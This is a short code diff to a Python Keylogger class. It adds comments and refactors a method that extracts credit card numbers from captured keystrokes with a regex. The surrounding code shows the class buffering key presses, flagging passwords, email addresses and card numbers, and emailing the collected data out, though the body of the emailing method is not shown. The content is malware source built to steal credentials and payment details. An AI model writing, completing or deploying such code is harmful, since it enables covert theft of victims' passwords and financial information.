@@ -16,6 +16,7 @@ class Keylogger:
         self.shift_keys = 0
         self.special_keys = {'space': ' ', 'shift': '', 'right shift': '', 'enter': '\\n'}
 
+    # Handles a key pressed by the user and adds it to the local buffer (raw and formatted)
     def __handle_key_press(self, event):
         # On key down, add the key to the local buffer
         if event.event_type == "down":
@@ -33,11 +34,13 @@ class Keylogger:
             if event.name == "shift" or event.name ==  'right shift':
                 self.shift_keys -= 1
             
-    def __get_credit_card_info(self, buffer: str) -> dict:
-        credit_card_info = [{"creditCardNumbers": re.findall(CREDIT_CARD_NUMBER_REGEXP, buffer)}]
+    # Gets any credit card info from the local buffer (credit card number, expiry date, cvv number)
+    def __get_credit_card_info(self, buffer: str) -> list:
+        credit_card_numbers = re.findall(CREDIT_CARD_NUMBER_REGEXP, buffer)
         
-        return credit_card_info
+        return credit_card_numbers
 
+    # Flags the desired information from the buffer (passwords, emails, credit card numbers)
     def __flag_data(self, buffer: str) -> dict:
         # Check email with regex
         # Check digits
@@ -45,6 +48,7 @@ class Keylogger:
 
         return formatted_local_buffer
 
+    # Emails the local buffer and the formatted / flagged data
     def __email_local_buffer(self, emailer: Emailer) -> bool:
         
         # Flag stuff
